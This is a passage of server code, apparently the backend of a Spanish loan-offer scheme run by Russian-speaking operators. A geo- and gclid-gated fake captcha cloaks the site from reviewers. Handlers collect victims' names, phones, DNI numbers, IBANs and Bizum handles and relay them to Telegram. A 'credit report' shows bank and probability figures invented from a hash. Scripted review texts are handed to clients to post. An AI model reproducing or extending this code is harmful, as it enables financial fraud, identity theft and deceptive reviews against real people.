    allowed: true,
    status: false,
    url: config.redirects.humanRedirectUrl,
    ui: HUMAN_UI,
  });
}

async function handleScratchVerify(req, reply) {
  console.log(`[scratch-verify] IN  ip=${getClientIp(req)}`);
  try {
    const body = asRecord(req.body) ?? {};
    const ip = getClientIp(req);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80) || null;

    const geoResult = await resolveGeo(req, ip);
    const country = geoResult.geo?.country || 'UNKNOWN';
    const city = geoResult.geo?.city || '';
    const region = geoResult.geo?.region || '';
    const postal = geoResult.geo?.postal || '';

    const pointerEvents = asRecord(body.pointerEvents);
    const bbox = asRecord(body.bbox);
    const canvas = asRecord(body.canvas);
    const clearedPercent = getNumber(body.clearedPercent);

    if (clearedPercent === null || !pointerEvents || !bbox || !canvas) {
      const text = [
        '*SCRATCH - INVALID PAYLOAD*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
        'Reason: missing required fields',
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_payload',
      });
      return reply.send(json);
    }

    const canvasWidth = getNumber(canvas.canvasWidth);
    const canvasHeight = getNumber(canvas.canvasHeight);
    const bboxWidth = getNumber(bbox.bboxWidth) ?? 0;
    const bboxHeight = getNumber(bbox.bboxHeight) ?? 0;

    if (canvasWidth === null || canvasHeight === null) {
      const text = [
        '*SCRATCH - INVALID METRICS*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_metrics',
      });
      return reply.send(json);
    }

    const hasPointerDown = getBoolean(pointerEvents.hasPointerDown) ?? false;
    const hasPointerMove = getBoolean(pointerEvents.hasPointerMove) ?? false;
    const reasons = [];

    const clearedOk = clearedPercent >= 70;
    reasons.push(clearedOk ? `cleared: ${clearedPercent.toFixed(1)}% ok` : `cleared: ${clearedPercent.toFixed(1)}% fail`);

    const pointerAllOk = hasPointerDown && hasPointerMove;
    reasons.push(pointerAllOk ? 'pointer: ok' : 'pointer: fail');

    const widthCoverage = canvasWidth > 0 ? bboxWidth / canvasWidth : 0;
    const heightCoverage = canvasHeight > 0 ? bboxHeight / canvasHeight : 0;
    const widthValid = widthCoverage >= 0.4;
    const heightValid = heightCoverage >= 0.4;
    reasons.push(widthValid ? 'widthCov: ok' : `widthCov: ${(widthCoverage * 100).toFixed(0)}% fail`);
    reasons.push(heightValid ? 'heightCov: ok' : `heightCov: ${(heightCoverage * 100).toFixed(0)}% fail`);

    const hasCountry = Boolean(geoResult.geo?.country);
    const geoOk = hasCountry && country === 'ES';
    if (!geoResult.available) reasons.push('geo: unavailable');
    else if (!hasCountry) reasons.push('geo: UNKNOWN fail');
    else reasons.push(geoOk ? 'geo: ES ok' : `geo: ${country} fail`);

    const rawQuery = getString(body.query);
    const hasGclid = rawQuery.toLowerCase().includes('gclid');
    reasons.push(hasGclid ? 'gclid: ok' : 'gclid: fail');

    const humanLike = clearedOk && pointerAllOk && widthValid && heightValid;
    const approved = humanLike && geoOk && hasGclid;

    const user = asRecord(body.user) ?? {};
    const userName = getString(user.name);
    const userPhone = getString(user.phone);
    const userEmail = sanitizeString(getString(user.email), 200);
    await rememberSmsReminderPhone(flowSessionId, userPhone);

    // Определяем новичок/турист через financiar24 и шлём отдельным сообщением в TG.
    // Не ждём результата — капча должна ответить клиенту мгновенно.
    void classifyAndNotifyClientType(flowSessionId, userEmail, userPhone, { country });

    const lines = [
      `*SCRATCH - ${approved ? 'HUMAN' : 'BOT'}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      '',
      `IP: \`${ip}\``,
      `Country: *${country}* ${city ? `(${city})` : ''}`,
      `Query: \`${rawQuery || 'empty'}\``,
      '',
      `Login: ${userName || '-'}`,
      `Phone: ${userPhone || '-'}`,
      '',
      reasons.join('\n'),
      '',
      `humanLike: ${humanLike ? 'YES' : 'NO'}`,
      `geoOk: ${geoOk ? 'YES' : 'NO'}`,
      `hasGclid: ${hasGclid ? 'YES' : 'NO'}`,
      `Result: ${approved ? 'APPROVED → link-bank' : 'REJECTED → ожидание TG'}`,
    ].filter(Boolean);

    console.log(`[scratch-verify] verdict=${approved ? 'HUMAN' : 'BOT'} ip=${ip} country=${country}`);

    if (approved) sendToTelegram(lines.join('\n'));

    await appendJsonLine(scratchLogFile, {
      ts: new Date().toISOString(),
      flowSessionId, ip, country, city, postal,
      user: { name: maskName(userName), phone: maskPhone(userPhone) },
      verdict: approved ? 'human' : 'bot',
      humanLike, geoOk, hasGclid, reasons,
    });

    if (!approved) {
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(lines.join('\n'), shortId);
      return reply.send(json);
    }

    if (flowSessionId) await markCaptchaPassed(flowSessionId);

    return reply.send({
      status: false,
      url: config.redirects.humanRedirectUrl,
      ui: HUMAN_UI,
      allowed: true,
      accessToken: null,
      geo: { country, city, region, postal },
    });
  } catch (err) {
    console.error('[SCRATCH-VERIFY ERROR]', err);
    const { json } = buildBotResponse(null);
    return reply.send(json);
  }
}

// ─── Tourist status tracking (/api/track) ────────────────────────────────────

const TOURIST_STATUS_LABELS = {
  tourist_active:              '🏦 КЛИЕНТ ВОШЁЛ В ЛИЧНЫЙ КАБИНЕТ (activeLead)',
  newcomer_active:             '🏦 НОВИЧОК ВОШЁЛ В ЛИЧНЫЙ КАБИНЕТ (activeLead)',
  tourist_bank_selected:       '1️⃣ КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:     '📋 Клиент открыл страницу ожидания',
  tourist_chat_opened:         '🔗 Клиент нажал «Iniciar conversación»',
  tourist_chat_reached:        '2️⃣ КЛИЕНТ ДОШЁЛ ДО ЧАТА',
  tourist_bot_started:         '3️⃣ БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue: '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:        '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ (кнопка нажата)',
  tourist_card_page_opened:    '📝 Клиент открыл форму заявки',
  tourist_card_ordered:        '5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
};

async function handleTrack(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const event = sanitizeString(getString(body.event), 80);
    if (!event) return reply.status(400).send({ ok: false });

    const email = sanitizeString(getString(body.email), 200);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const bank = sanitizeString(getString(body.bank), 120);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    // Persist to DB
    const status = STATUS_MAP[event];
    const patch = {};
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (ip) patch.ip = ip;
    if (status) patch.status = status;

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, event, { bank: bank || null, email: email || null, ip: ip || null });

    // Telegram notification
    const label = TOURIST_STATUS_LABELS[event] || `📌 ${event}`;
    const lines = [
      `*${label}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);

    sendToTelegram(lines.join('\n'));
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[track] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Tourist: call request + status polling ───────────────────────────────────

async function handleCallRequest(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const email = sanitizeString(getString(body.email), 200);
    const bank = sanitizeString(getString(body.bank), 120);
    const nombre = sanitizeString(getString(body.nombre), 200);
    const phone = sanitizeString(getString(body.phone), 30);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    // Если клиент уже был прозвонен — это повторный запрос → переводим в старые клиенты
    let wasAlreadyCalled = false;
    let existingSub = {};
    if (flowSessionId) {
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { operatorCalled: true, operatorStatus: true, submissionData: true },
        });
        wasAlreadyCalled = !!(existing?.operatorCalled ||
          (existing?.operatorStatus && existing.operatorStatus !== 'pending'));
        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
      } catch { /* колонки могут ещё не существовать */ }
    }

    const patch = {
      callRequested: true,
      status: 'ЗАПРОСИЛ ЗВОНОК (ПОВТОРНО)',
    };
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (nombre) patch.nombre = nombre;
    if (ip) patch.ip = ip;
    if (phone) patch.submissionData = { ...existingSub, phone };

    if (wasAlreadyCalled) {
      patch.operatorStatus = 'pending';
      patch.operatorCalled = false;
      patch.calledAt = null;
      patch.status = 'ПОВТОРНЫЙ ЗАПРОС ЗВОНКА';
    }

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, 'tourist_call_requested', { bank: bank || null, email: email || null, ip: ip || null, repeated: wasAlreadyCalled });

    const lines = [
      wasAlreadyCalled ? '*🔄 ПОВТОРНЫЙ ЗАПРОС ЗВОНКА (→ Старые клиенты)*' : '*📞 ЗАПРОСИЛ ЗВОНОК*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      nombre ? `Имя: *${nombre}*` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      phone ? `Тел: ${phone}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));
    broadcastUpdate('clients_changed');

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[call-request] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

async function handleTouristStatus(req, reply) {
  reply.header('Cache-Control', 'no-store');
  try {
    const flowSessionId = sanitizeString(req.query.s || '', 80);
    if (!flowSessionId) return reply.send({
      operatorCalled: false,
      operatorStatus: 'pending',
      paymentMethod: '',
      iban: '',
      bizum: '',
    });

    let client = null;
    try {
      client = await prisma.webClient.findUnique({
        where: { flowSessionId },
        select: { operatorCalled: true, status: true, operatorStatus: true, submissionData: true, nombre: true },
      });
    } catch (e) {
      if (e?.code === 'P2022') {
        client = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { operatorCalled: true, status: true, nombre: true },
        });
      } else throw e;
    }

    const sub = (client?.submissionData && typeof client.submissionData === 'object') ? client.submissionData : {};
    const paymentDetails = getClientPaymentDetails(sub);
    const opStatus = client?.operatorStatus ?? (client?.operatorCalled ? 'called' : 'pending');
    return reply.send({
      operatorCalled: client?.operatorCalled ?? false,
      operatorStatus: opStatus,
      ...paymentDetails,
      nombre: client?.nombre || sub.nombre || '',
    });
  } catch {
    return reply.send({
      operatorCalled: false,
      operatorStatus: 'pending',
      paymentMethod: '',
      iban: '',
      bizum: '',
    });
  }
}

function buildLiteProfile(client) {
  const submissionData = (client?.submissionData && typeof client.submissionData === 'object')
    ? client.submissionData
    : {};
  const saved = (submissionData.liteProfile && typeof submissionData.liteProfile === 'object')
    ? submissionData.liteProfile
    : {};
  const savedNumber = (value) => {
    if (value === null || value === undefined || value === '') return null;
    const numericValue = Number(value);
    return Number.isFinite(numericValue) ? numericValue : null;
  };
  return {
    name: saved.name || client?.nombre || '',
    email: saved.email || client?.email || '',
    phone: saved.phone || submissionData.phone || '',
    amount: savedNumber(saved.amount),
    incomeSource: saved.incomeSource || '',
    monthlyIncome: savedNumber(saved.monthlyIncome),
    purpose: saved.purpose || '',
    urgency: saved.urgency || '',
    term: savedNumber(saved.term),
    updatedAt: saved.updatedAt || null,
  };
}

async function handleGetLiteProfile(req, reply) {
  reply.header('Cache-Control', 'no-store');
  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
  if (!flowSessionId) return reply.send({ profile: null });
  try {
    const client = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { nombre: true, email: true, submissionData: true },
    });
    return reply.send({ profile: client ? buildLiteProfile(client) : null });
  } catch (err) {
    console.error('[lite/profile/get]', err?.message || err);
    return reply.send({ profile: null });
  }
}

async function handleSaveLiteProfile(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });

    const numericAmount = Number(body.amount);
    const numericIncome = Number(body.monthlyIncome);
    const numericTerm = Number(body.term);
    const profile = {
      name: sanitizeString(getString(body.name), 200),
      email: sanitizeString(getString(body.email), 200),
      phone: sanitizeString(getString(body.phone), 30),
      amount: Number.isFinite(numericAmount) ? Math.max(500, Math.min(100000, Math.round(numericAmount))) : null,
      incomeSource: sanitizeString(getString(body.incomeSource), 100),
      monthlyIncome: Number.isFinite(numericIncome) ? Math.max(0, Math.min(100000, Math.round(numericIncome))) : null,
      purpose: sanitizeString(getString(body.purpose), 160),
      urgency: sanitizeString(getString(body.urgency), 100),
      term: Number.isFinite(numericTerm) ? Math.max(1, Math.min(120, Math.round(numericTerm))) : null,
      updatedAt: new Date().toISOString(),
    };
    if (!profile.name || !profile.email || !profile.phone) {
      return reply.status(400).send({ error: 'contact data required' });
    }

    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { submissionData: true },
    }).catch(() => null);
    const submissionData = (existing?.submissionData && typeof existing.submissionData === 'object')
      ? existing.submissionData
      : {};
    const client = await upsertWebClient(flowSessionId, {
      nombre: profile.name,
      email: profile.email,
      status: 'LITE: АНКЕТА ЗАПОЛНЕНА',
      submissionData: {
        ...submissionData,
        phone: profile.phone,
        liteProfile: profile,
      },
    });
    await createWebEvent(flowSessionId, client?.id, 'lite_profile_completed', {
      amount: profile.amount,
      purpose: profile.purpose || null,
    });
    sendToTelegram([
      '*⚡ LITE: КЛИЕНТ ЗАПОЛНИЛ АНКЕТУ*',
      `Session: \`${flowSessionId}\``,
      `Имя: *${profile.name}*`,
      `Email: ${profile.email}`,
      `Тел: ${profile.phone}`,
      profile.amount ? `Сумма: *€${profile.amount.toLocaleString('es-ES')}*` : '',
      profile.incomeSource ? `Доход: ${profile.incomeSource}` : '',
      profile.purpose ? `Цель: ${profile.purpose}` : '',
    ].filter(Boolean).join('\n'));
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, profile });
  } catch (err) {
    console.error('[lite/profile/save]', err?.message || err);
    return reply.status(500).send({ error: 'lite_profile_failed' });
  }
}

const LITE_REPORT_CONTENT = {
  report: {
    documentTitle: 'Profile - Pro Plan',
    headerTitle: 'Tu perfil',
    planBadge: 'PRO',
    profileSubtitle: 'Tu informe personal breve',
    optionsLabel: 'Opciones',
    optionStats: [
      { label: 'Bancos' },
      { label: 'Opciones' },
      { label: 'Adecuadas' },
    ],
    levelLabel: 'Nivel',
    levelStats: [
      { source: 'amount', label: 'Objetivo' },
      { value: 'Medio', label: 'Ingreso' },
      { source: 'confidence', label: 'Confiabilidad' },
    ],
    commentLabel: 'Comentario',
    comment: 'Si necesitas el informe completo, simplemente escríbenos.',
    predictionsTitle: 'Predicciones',
    predictions: [
      { name: 'Bancos grandes', rating: 'Baja probabilidad' },
      { name: 'Bancos medianos', rating: 'Alta probabilidad' },
      { name: 'Créditos rápidos', rating: 'Baja probabilidad' },
    ],
    buttonLabel: 'Continuar',
  },
};

function formatLiteAmount(value) {
  if (value === null || value === undefined || value === '') return '';
  if (!Number.isFinite(Number(value))) return '';
  return `€${String(Math.round(Number(value))).replace(/\B(?=(\d{3})+(?!\d))/g, ',')}`;
}

function buildLiteReportMetrics(client) {
  const seed = [client?.flowSessionId, client?.email, client?.nombre]
    .filter(Boolean)
    .join('|') || 'avalavance-lite-report';
  const digest = createHash('sha256').update(seed).digest();
  const shift = (index) => (digest[index] % 11) - 5;
  const range = (index, minimum, maximum) => minimum + (digest[index] % (maximum - minimum + 1));
  return {
    banks: 11 + shift(0),
    options: 48 + shift(1),
    suitable: 7 + shift(2),
    confidence: 79 + shift(3),
    predictionLargeBanks: range(4, 20, 40),
    predictionMediumBanks: range(5, 30, 60),
    predictionFastCredit: range(6, 50, 80),
  };
}

function buildLiteReport(client) {
  const submissionData = (client?.submissionData && typeof client.submissionData === 'object')
    ? client.submissionData
    : {};
  const saved = (submissionData.liteReportProfile && typeof submissionData.liteReportProfile === 'object')
    ? submissionData.liteReportProfile
    : {};
  const numericAmount = Number(saved.amount);
  const amount = Number.isFinite(numericAmount) && numericAmount > 0 ? numericAmount : null;
  const profile = {
    name: saved.name || client?.nombre || 'Cliente AvalAvance',
    email: saved.email || client?.email || '',
    amount,
    amountLabel: formatLiteAmount(amount),
  };
  const metrics = buildLiteReportMetrics(client);
  const optionValues = [metrics.banks, metrics.options, metrics.suitable];
  const predictionValues = [
    metrics.predictionLargeBanks,
    metrics.predictionMediumBanks,
    metrics.predictionFastCredit,
  ];
  const report = {
    ...LITE_REPORT_CONTENT.report,
    optionStats: LITE_REPORT_CONTENT.report.optionStats.map((item, index) => ({
      ...item,
      value: String(optionValues[index]),
    })),
    levelStats: LITE_REPORT_CONTENT.report.levelStats.map((item) => (
      item.source === 'confidence'
        ? { ...item, value: `${metrics.confidence}%` }
        : { ...item }
    )),
    predictions: LITE_REPORT_CONTENT.report.predictions.map((item, index) => ({
      ...item,
      percent: predictionValues[index],
    })),
  };
  return {
    profile,
    report,
  };
}

async function handleGetLiteReport(req, reply) {
  reply.header('Cache-Control', 'no-store');
  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
  if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });
  try {
    const client = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { flowSessionId: true, nombre: true, email: true, submissionData: true },
    });
    return reply.send(buildLiteReport(client ? { ...client, flowSessionId } : { flowSessionId }));
  } catch (err) {
    console.error('[lite/report/get]', err?.message || err);
    return reply.status(500).send({ error: 'lite_report_failed' });
  }
}

async function handleSaveLiteReport(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });
    const name = sanitizeString(getString(body.name), 200);
    const email = sanitizeString(getString(body.email), 200);
    const numericAmount = Number(body.amount);
    const amount = Number.isFinite(numericAmount) && numericAmount > 0
      ? Math.max(250, Math.min(100000, Math.round(numericAmount)))
      : null;
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { submissionData: true },
    }).catch(() => null);
    const submissionData = (existing?.submissionData && typeof existing.submissionData === 'object')
      ? existing.submissionData
      : {};
    const previousProfile = (submissionData.liteReportProfile && typeof submissionData.liteReportProfile === 'object')
      ? submissionData.liteReportProfile
      : {};
    const liteReportProfile = {
      ...previousProfile,
      ...(name ? { name } : {}),
      ...(email ? { email } : {}),
      ...(amount ? { amount } : {}),
      updatedAt: new Date().toISOString(),
    };
    const patch = {
      submissionData: { ...submissionData, liteReportProfile },
      status: 'LITE: ОТЧЁТ ПОДГОТОВЛЕН',
    };
    if (name) patch.nombre = name;
    if (email) patch.email = email;
    const client = await upsertWebClient(flowSessionId, patch);
    await createWebEvent(flowSessionId, client?.id, 'lite_report_loaded', {
      amount: liteReportProfile.amount || null,
    });
    broadcastUpdate('clients_changed');
    return reply.send(buildLiteReport({
      ...client,
      flowSessionId,
      submissionData: patch.submissionData,
    }));
  } catch (err) {
    console.error('[lite/report/save]', err?.message || err);
    return reply.status(500).send({ error: 'lite_report_failed' });
  }
}

// ─── Credit card form submission ──────────────────────────────────────────────

async function handleCreditCardSubmission(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const submittedPaymentMethod = sanitizeString(getString(body.paymentMethod), 20).toLowerCase();
    const submittedBizum = normalizeBizum(getString(body.bizum));
    const formData = {
      nombre: sanitizeString(getString(body.nombre), 200),
      phone: sanitizeString(getString(body.phone), 30),
      dni: sanitizeString(getString(body.dni), 20),
      iban: sanitizeString(getString(body.iban), 50),
      calle: sanitizeString(getString(body.calle), 300),
      piso: sanitizeString(getString(body.piso), 100),
      ciudad: sanitizeString(getString(body.ciudad), 100),
      provincia: sanitizeString(getString(body.provincia), 100),
      cp: sanitizeString(getString(body.cp), 10),
      email: sanitizeString(getString(body.email), 200),
    };

    // Merge with existing submissionData to preserve the payment destination
    // collected during the first chat.
    let existingSub = {};
    if (flowSessionId) {
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { submissionData: true },
        });
        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object')
          ? existing.submissionData : {};
      } catch { /* non-fatal */ }
    }

    let submissionData = { ...existingSub };
    if (submittedPaymentMethod === 'bizum' && submittedBizum) {
      submissionData = applyChatPaymentDetails(submissionData, {
        paymentMethod: 'bizum',
        iban: null,
        bizum: submittedBizum,
      });
    }
    const selectedPayment = getClientPaymentDetails(submissionData);
    for (const [k, v] of Object.entries(formData)) {
      if (!v) continue;
      // The card form has its own withdrawal IBAN. It must not replace the
      // Bizum destination selected in the first chat.
      if (k === 'iban' && selectedPayment.paymentMethod === 'bizum') {
        submissionData.cardIban = v;
      } else {
        submissionData[k] = v;
      }
    }
    // Preserve DNI/IBAN from chat if form doesn't supply them.
    if (!formData.dni && existingSub.dni) submissionData.dni = existingSub.dni;
    if (!formData.iban && existingSub.iban && submissionData.paymentMethod !== 'bizum') {
      submissionData.iban = existingSub.iban;
    }

    if (flowSessionId) {
      await upsertWebClient(flowSessionId, {
        nombre: submissionData.nombre || undefined,
        email: submissionData.email || undefined,
        status: 'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
        submissionData,
      });
    }

    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';
    const lines = [
      '*5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      submissionData.nombre ? `Имя: *${submissionData.nombre}*` : '',
      submissionData.email ? `Email: ${submissionData.email}` : '',
      submissionData.iban ? `IBAN: \`${submissionData.iban}\`` : '',
      submissionData.bizum ? `Bizum: \`${submissionData.bizum}\`` : '',
      submissionData.dni ? `DNI: \`${submissionData.dni}\`` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[credit-card-submission] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Caller admin ─────────────────────────────────────────────────────────────

// ── «Ожидание» (ban): статус + клиентский SSE + операторская кнопка ───────────
// Читаем флаг banned защищённо: колонки может не быть до миграции.
async function isClientBanned(flowSessionId) {
  if (!flowSessionId) return false;
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { banned: true },
    });
    return !!wc?.banned;
  } catch (e) {
    if (e?.code === 'P2022') return false; // колонки banned ещё нет
    return false;
  }
}

// Клиенту предлагаем оставить отзыв после того, как по нему отработало
// СМС-напоминание. Показываем один раз — дальше он возвращается к своей заявке.
async function clientReviewPrompt(flowSessionId) {
  if (!flowSessionId) return false;
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { submissionData: true },
    });
    const sub = (wc?.submissionData && typeof wc.submissionData === 'object') ? wc.submissionData : {};
    return !!sub.reviewPromptAt && !sub.reviewPromptSeen;
  } catch { return false; }
}

// Банк-получатель для RD2, выбранный оператором.
async function clientRd2Bank(flowSessionId) {
  if (!flowSessionId) return null;
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId },
      select: { submissionData: true },
    });
    const sub = (wc?.submissionData && typeof wc.submissionData === 'object') ? wc.submissionData : {};
    const saved = sub.rd2Bank;
    if (!saved || typeof saved !== 'object' || !saved.key) return null;
    // Сверяем со справочником — так переименование банка подхватится само.
    return RD2_BANKS.find((b) => b.key === saved.key) || null;
  } catch { return null; }
}

// GET /api/client/state?flowSessionId=... — проверка при заходе на страницу.
async function handleClientState(req, reply) {
  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
  const [banned, reviewPrompt, rd2Bank] = await Promise.all([
    isClientBanned(flowSessionId),
    clientReviewPrompt(flowSessionId),
    clientRd2Bank(flowSessionId),
  ]);
  return reply.send({ banned, reviewPrompt, rd2Bank });
}

// ── Тексты отзывов: админка ───────────────────────────────────────────────────
// Подмешиваем имя клиента, чтобы в списке было видно, кому текст ушёл.
async function reviewTextsWithClients(texts) {
  const ids = [...new Set(texts.map((t) => t.sessionId).filter(Boolean))];
  const names = new Map();
  if (ids.length) {
    try {
      const clients = await prisma.webClient.findMany({
        where: { flowSessionId: { in: ids } },
        select: { flowSessionId: true, nombre: true, email: true },
      });
      for (const c of clients) names.set(c.flowSessionId, c.nombre || c.email || '');
    } catch (e) { console.error('[review-texts/clients]', e?.message); }
  }
  return texts.map((t) => ({ ...t, clientName: t.sessionId ? (names.get(t.sessionId) || '') : '' }));
}

async function handleGetReviewTexts(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    return reply.send({ texts: await reviewTextsWithClients(await readReviewTexts()) });
  } catch (err) {
    console.error('[review-texts/get]', err?.message || err);
    return reply.status(500).send({ error: 'get_failed' });
  }
}

async function handleCreateReviewText(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const text = sanitizeString(getString(body.text), 2000);
    if (!text) return reply.status(400).send({ error: 'text required' });
    const texts = await readReviewTexts();
    texts.push({
      id: randomUUID(),
      text,
      status: 'free',
      sessionId: null,
      offeredAt: null,
      screenshotUrl: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    await writeReviewTexts(texts);
    return reply.send({ texts: await reviewTextsWithClients(texts) });
  } catch (err) {
    console.error('[review-texts/create]', err?.message || err);
    return reply.status(500).send({ error: 'create_failed' });
  }
}

async function handleUpdateReviewText(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(String(req.params?.id || ''), 80);
    const body = asRecord(req.body) ?? {};
    const texts = await readReviewTexts();
    const item = texts.find((t) => t.id === id);
    if (!item) return reply.status(404).send({ error: 'not_found' });

    if (typeof body.text === 'string') {
      const text = sanitizeString(body.text, 2000);
      if (text) item.text = text;
    }
    if (typeof body.status === 'string' && REVIEW_STATUSES.has(body.status)) {
      item.status = body.status;
      // Вернули в «свободен» — отвязываем от клиента, иначе он не получит новый.
      if (body.status === 'free') { item.sessionId = null; item.offeredAt = null; }
    }
    item.updatedAt = new Date().toISOString();
    await writeReviewTexts(texts);
    return reply.send({ texts: await reviewTextsWithClients(texts) });
  } catch (err) {
    console.error('[review-texts/update]', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

async function handleDeleteReviewText(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(String(req.params?.id || ''), 80);
    const texts = (await readReviewTexts()).filter((t) => t.id !== id);
    await writeReviewTexts(texts);
    return reply.send({ texts: await reviewTextsWithClients(texts) });
  } catch (err) {
    console.error('[review-texts/delete]', err?.message || err);
    return reply.status(500).send({ error: 'delete_failed' });
  }
}

// ── Тексты отзывов: клиент ────────────────────────────────────────────────────
// Выдаём клиенту его текст: уже закреплённый или первый свободный.
async function handleClientReviewText(req, reply) {
  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
  if (!flowSessionId) return reply.send({ text: '' });
  try {
    const texts = await readReviewTexts();
    let mine = texts.find((t) => t.sessionId === flowSessionId);
    if (!mine) {
      mine = texts.find((t) => t.status === 'free' && !t.sessionId);
      if (mine) {
        mine.sessionId = flowSessionId;
        mine.status = 'offered';
        mine.offeredAt = new Date().toISOString();
        mine.updatedAt = mine.offeredAt;
        await writeReviewTexts(texts);
      }
    }
    // Свободных заготовок нет — страница покажет свой текст по умолчанию.
    return reply.send({ text: mine?.text || '', id: mine?.id || null });
  } catch (err) {
    console.error('[client/review-text]', err?.message || err);
    return reply.send({ text: '' });
  }
}

// Клиент отказался — освобождать текст не будем, пусть админ видит отказ.
async function handleClientReviewDecline(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    if (!flowSessionId) return reply.send({ ok: true });
    const texts = await readReviewTexts();
    const mine = texts.find((t) => t.sessionId === flowSessionId);
    // Отказ после присланного скриншота статус не откатывает.
    if (mine && mine.status === 'offered') {
      mine.status = 'cancelled';
      mine.updatedAt = new Date().toISOString();
      await writeReviewTexts(texts);
    }
    return reply.send({ ok: true });
  } catch { return reply.send({ ok: true }); }
}

// Клиент прислал скриншот своего отзыва — считаем текст отработавшим.
async function handleClientReviewScreenshot(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const url = sanitizeString(getString(body.url), 300);
    if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });
    if (!url || !url.startsWith('/uploads/')) return reply.status(400).send({ error: 'bad url' });

    const texts = await readReviewTexts();
    const mine = texts.find((t) => t.sessionId === flowSessionId);
    if (mine) {
